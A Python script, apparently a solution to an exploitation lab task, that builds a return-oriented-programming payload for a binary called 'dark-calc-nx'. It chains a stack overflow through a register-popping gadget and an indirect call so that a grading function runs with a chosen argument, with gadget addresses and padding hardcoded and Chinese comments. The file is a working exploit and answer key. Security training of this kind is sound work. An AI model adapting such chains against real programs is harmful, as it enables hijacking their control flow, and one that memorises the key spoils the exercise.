#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx."""
import sys


def q(x):
    """8字节小端。"""
    return x.to_bytes(8, "little")


GRADE_EVAL = 0x401978  # grade_eval入口
CMD_BUF = 0x602090     # command_buf（.bss，内容可控）
POP6 = 0x401a2a        # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
RET = 0x401a34         # ret，用于调整栈对齐
MOV_CALL = 0x401a10    # mov r13d,edi; call *[r12+rbx*8]

# 链的结构：16字节缓冲区 | saved RBP | POP6 | 六个pop值 | RET | MOV_CALL | 填充
# 六个pop值依次是rbx=0、rbp=1（跳出csu循环）、r12=command_buf、r13=4（传给grade_eval）
payload = q(GRADE_EVAL)  # 会被input里的strcpy写入command_buf，作为间接调用目标
payload += b"A" * 8
payload += b"B" * 8
payload += q(POP6)
payload += q(0)
payload += q(1)
payload += q(CMD_BUF)
payload += q(4)
payload += q(0)
payload += q(0)
payload += q(RET)
payload += q(MOV_CALL)
payload += b"C" * 8
payload += b"D" * 48

payload += b"\n"

sys.stdout.buffer.write(payload)
